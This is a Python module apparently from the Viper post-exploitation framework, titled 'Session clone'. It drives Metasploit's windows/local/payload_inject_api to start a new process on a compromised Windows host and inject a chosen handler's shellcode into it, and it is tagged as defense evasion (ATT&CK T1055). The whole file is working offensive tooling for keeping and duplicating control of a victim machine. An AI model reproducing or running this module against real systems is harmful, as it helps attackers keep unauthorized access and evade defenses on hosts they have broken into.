# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "Session克隆"
    DESC_ZH = "模块在目标主机新建进程,将选择的Handler对应的shellcode注入到新进程中."

    NAME_EN = "Session clone"
    DESC_EN = "The module creates a new process on the target host and injects the shellcode corresponding to the selected handler into the new process."

    MODULETYPE = TAG2TYPE.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1055"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/pg4edl"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
    AUTHOR = ["Viper"]

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/payload_inject_api"
        self.opts['NEWPROCESS'] = True

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if not session.is_windows:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        flag = self.set_payload_by_handler()
        if flag is not True:
            return False, "无法解析Handler,请选择正确的监听", "Unable to resolve Handler, please select the correct handler"
        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
        else:
            self.log_info("模块执行完成", "Module operation completed")
            self.log_good(f"新进程PID: {data.get('pid')}", f"New process PID: {data.get('pid')}")
